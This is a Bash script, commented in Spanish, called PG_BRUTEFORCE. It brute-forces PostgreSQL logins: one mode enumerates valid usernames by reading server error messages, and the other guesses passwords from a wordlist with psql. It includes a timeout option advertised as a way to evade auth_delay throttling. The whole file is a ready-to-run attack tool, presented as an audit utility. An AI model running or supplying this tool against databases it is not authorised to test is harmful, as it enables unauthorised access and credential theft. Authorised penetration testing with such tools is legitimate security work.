#!/bin/bash

# --- Colores corregidos para alto contraste ---
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'  # Cian claro (mejor que azul en fondo negro)
NC='\033[0m' 

# --- Valores por defecto ---
HOST="127.0.0.1"
PORT="5432"
DB="postgres"
USER_DEFAULT="postgres"
PASS_DEFAULT="check_user_123"
USER_FILE=""
PASS_FILE=""
SKIP_PORT_CHECK=false
QUIET_MODE=false
OUTPUT_FILE=""
EXIT_ON_SUCCESS=false
CLI_TIMEOUT=5 # Valor por defecto (desactivado el bypass por defecto)

# --- Función de Ayuda ---
mostrar_ayuda() {
    echo -e "${CYAN}PG_BRUTEFORCE - Auditoría Profesional PostgreSQL${NC}"
    echo -e "Uso: $0 [opciones]"
    echo ""
    echo "Conexión:"
    echo "  -h <host>    Host del servidor. Default: 127.0.0.1."
    echo "  -p <port>    Puerto del servidor. Default: 5432."
    echo "  -d <db>      Base de datos a probar. Default: postgres."
    echo ""
    echo "Ataque:"
    echo "  -u <file>    Archivo con lista de usuarios."
    echo "  -f <file>    Archivo con lista de contraseñas."
    echo "  -U <user>    Usuario específico (usar con -f). Default: postgres."
    echo ""
    echo "Rendimiento y Bypass:"
    echo "  -T <seg>     Timeout máximo por intento (Default: 5s)."
    echo "               Sirve para evadir esperas largas de auth_delay."
    echo ""
    echo "Extras:"
    echo "  -S           Saltar validación de puerto TCP."
    echo "  -q           Modo Silencioso: Solo muestra hallazgos [->]."
    echo "  -x           Finalizar búsqueda al encontrar el primer acierto."
    echo "  -o <file>    Guardar resultados en un archivo."
    echo "  -H           Mostrar este menú de ayuda."
    exit 0
}

# --- Procesamiento de argumentos ---
while getopts "h:p:d:U:u:f:So:qxHT:" opt; do
  case $opt in
    h) HOST=$OPTARG ;;
    p) PORT=$OPTARG ;;
    d) DB=$OPTARG ;;
    U) USER_DEFAULT=$OPTARG ;;
    u) USER_FILE=$OPTARG ;;
    f) PASS_FILE=$OPTARG ;;
    S) SKIP_PORT_CHECK=true ;;
    q) QUIET_MODE=true ;;
    x) EXIT_ON_SUCCESS=true ;;
    o) OUTPUT_FILE=$OPTARG ;;
    T) CLI_TIMEOUT=$OPTARG ;;
    H) mostrar_ayuda ;;
    *) mostrar_ayuda ;;
  esac
done

# Función para imprimir logs
log_msg() {
    local TIPO=$1; local MSG=$2; local COLOR=$3; local PREFIJO=$4; local TIEMPO=$5
    local STR_TIEMPO=""
    [[ -n "$TIEMPO" ]] && STR_TIEMPO=" [${TIEMPO}s]"
    
    if [ "$QUIET_MODE" = false ] || [ "$TIPO" = "SUCCESS" ]; then
        echo -e "${COLOR}${PREFIJO}${STR_TIEMPO} ${MSG}${NC}"
    fi

    if [ -n "$OUTPUT_FILE" ]; then
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] [$TIPO]$STR_TIEMPO $MSG" >> "$OUTPUT_FILE"
    fi
}

# --- 1. Validación de alcance al puerto ---
if [ "$SKIP_PORT_CHECK" = false ]; then
    [ "$QUIET_MODE" = false ] && echo -n "[*] Validando puerto $PORT en $HOST... "
    if ! timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null; then
        log_msg "ERROR" "ERROR: No hay alcance al puerto $PORT." "$RED" "[X]"
        exit 1
    fi
    [ "$QUIET_MODE" = false ] && echo -e "${GREEN}¡Alcanzable!${NC}"
fi

# --- Funciones de Ataque ---

ataque_usuarios() {
    [ "$QUIET_MODE" = false ] && echo -e "${CYAN}[!] Iniciando fuerza bruta de USUARIOS en DB: $DB...${NC}"
    while IFS= read -r username; do
        [[ -z "$username" ]] && continue
        
        start_t=$(date +%s.%N)
        RES=$(PGPASSWORD="$PASS_DEFAULT" timeout "${CLI_TIMEOUT}s" psql -h "$HOST" -p "$PORT" -d "$DB" -U "$username" -c "SELECT 1" 2>&1)
        status=$?
        duration=$(echo "$(date +%s.%N) - $start_t" | bc)
        
        if [ $status -eq 124 ]; then
            log_msg "TIMEOUT" "Salto por Timeout (> ${CLI_TIMEOUT}s) en usuario: '$username'" "$YELLOW" "[!]" "$duration"
        elif [[ $RES == *"password authentication failed"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: $username (Requiere contraseña)" "$GREEN" "[->]" "$duration"
            [ "$EXIT_ON_SUCCESS" = true ] && exit 0
        elif [[ $RES == *"SELECT 1"* ]]; then
            log_msg "SUCCESS" "¡ACCESO DIRECTO!: Usuario '$username' sin pass." "$YELLOW" "[->]" "$duration"
            [ "$EXIT_ON_SUCCESS" = true ] && exit 0
        elif [[ $RES == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: $username (Aunque la DB '$DB' no existe)" "$YELLOW" "[->]" "$duration"
            [ "$EXIT_ON_SUCCESS" = true ] && exit 0
        elif [[ $RES == *"no pg_hba.conf entry"* ]]; then
            log_msg "DENIED" "Usuario '$username' denegado (pg_hba.conf)" "$RED" "[X]" "$duration"
        elif [[ $RES == *"role \"$username\" does not exist"* ]]; then
            log_msg "INFO" "Usuario '$username' no existe." "$RED" "[X]" "$duration"
        fi
    done < "$USER_FILE"
}

ataque_passwords() {
    [ "$QUIET_MODE" = false ] && echo -e "${CYAN}[!] Probando contraseñas para: $USER_DEFAULT (Timeout: ${CLI_TIMEOUT}s)${NC}"
    while IFS= read -r password; do
        [[ -z "$password" ]] && continue
        
        start_t=$(date +%s.%N)
        RES=$(PGPASSWORD="$password" timeout "${CLI_TIMEOUT}s" psql -h "$HOST" -p "$PORT" -d "$DB" -U "$USER_DEFAULT" -c "SELECT 1" 2>&1)
        status=$?
        duration=$(echo "$(date +%s.%N) - $start_t" | bc)
        
        if [ $status -eq 124 ]; then
            log_msg "TIMEOUT" "Salto por Timeout (> ${CLI_TIMEOUT}s) en pass: '$password'" "$YELLOW" "[!]" "$duration"
        elif [ $status -eq 0 ]; then
            log_msg "SUCCESS" "¡PASS ENCONTRADA! -> $USER_DEFAULT:$password" "$GREEN" "[->]" "$duration"
            exit 0
        elif [[ $RES == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "¡PASS VÁLIDA ENCONTRADA!: $password (Pero la DB '$DB' no existe)" "$YELLOW" "[->]" "$duration"
            exit 0
        else
            log_msg "FAIL" "Fallido: $password" "$RED" "[X]" "$duration"
        fi
    done < "$PASS_FILE"
}

# --- Ejecución lógica ---
if [[ -n "$USER_FILE" ]] && [[ -f "$USER_FILE" ]]; then
    ataque_usuarios
elif [[ -n "$PASS_FILE" ]] && [[ -f "$PASS_FILE" ]]; then
    ataque_passwords
else
    mostrar_ayuda
fi
